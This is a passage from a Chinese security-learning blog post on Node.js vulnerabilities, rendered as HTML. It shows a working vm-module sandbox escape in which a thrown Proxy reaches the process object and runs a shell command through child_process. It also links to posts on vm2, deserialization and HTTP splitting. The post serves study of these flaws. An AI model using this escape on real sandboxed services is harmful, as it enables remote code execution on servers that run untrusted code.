+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>abc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如上代码就是将对象a实例化为了一个Proxy对象，然后访问abc属性（不存在）触发get方法，进而导致命令执行</p>
+<hr>
+<h3 id="借助异常处理"><a href="#借助异常处理" class="headerlink" title="借助异常处理"></a>借助异常处理</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> script <span class="token operator">=</span> 
+<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+    throw new Proxy(&#123;&#125;, &#123;
+        get: function()&#123;
+            const cc = arguments.callee.caller;
+            const p = (cc.constructor.constructor('return process'))();
+            return p.mainModule.require('child_process').execSync('whoami').toString();
+        &#125;
+    &#125;)
+</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+    vm<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>script<span class="token punctuation">,</span> vm<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"error:"</span> <span class="token operator">+</span> e<span class="token punctuation">)</span> 
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上述代码表面上看因为没有返回值，无法直接利用</p>
+<p>而这里我们用了<code>throw new Proxy</code>，catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来</p>
+<p><img src="/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20231018113442307.png" alt="image-20231018113442307"></p>
+<hr>
+<h1 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h1><p>不急（</p>
+<p>相关漏洞：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6FarJC2THHqUyS5cE0h9mA">JSONPath Plus远程代码执行漏洞（CVE-2025-1302）</a></p>
+<hr>
+<h1 id="serialize模块反序列化漏洞"><a href="#serialize模块反序列化漏洞" class="headerlink" title="serialize模块反序列化漏洞"></a>serialize模块反序列化漏洞</h1><p>跳转链接：<a href="https://c1oudfl0w0.github.io/blog/2023/01/18/serialize%E6%A8%A1%E5%9D%97%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">https://c1oudfl0w0.github.io/blog/2023/11/18/serialize模块反序列化漏洞</a></p>
+<hr>
+<h1 id="Nodejs-HTTP拆分攻击"><a href="#Nodejs-HTTP拆分攻击" class="headerlink" title="Nodejs HTTP拆分攻击"></a>Nodejs HTTP拆分攻击</h1><p>跳转链接：<a href="https://c1oudfl0w0.github.io/blog/2024/1/20/Nodejs-HTTP%E6%8B%86%E5%88%86%E6%94%BB%E5%87%BB">https://c1oudfl0w0.github.io/blog/2024/1/20/Nodejs-HTTP拆分攻击</a></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
